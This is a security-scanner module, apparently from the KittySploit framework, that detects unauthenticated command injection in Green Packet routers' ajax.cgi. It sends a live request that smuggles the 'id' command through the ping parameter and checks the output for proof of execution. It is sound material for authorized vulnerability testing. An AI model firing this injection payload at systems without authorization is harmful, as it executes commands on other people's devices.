#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Green Packet router ajax.cgi OS command injection."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Green Packet Router - ajax.cgi RCE Detection',
        'description': (
            'Detects Green Packet OS command injection via '
            '/ajax.cgi?action=tag_ipPing&pip=127.0.0.1%26id%26.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'greenpacket', 'router', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/greenpacket_ajax_cgi_rce'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/42130',
        ],
    }

    def run(self):
        path = '/ajax.cgi?action=tag_ipPing&pip=127.0.0.1%26id%26&cache=false'
        r = self.http_request(
            method='GET',
            path=path,
            headers={
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': 'page=manage_dping.php',
            },
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        if re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='Green Packet ajax.cgi command injection',
                path='/ajax.cgi',
            )
            return True
        return False
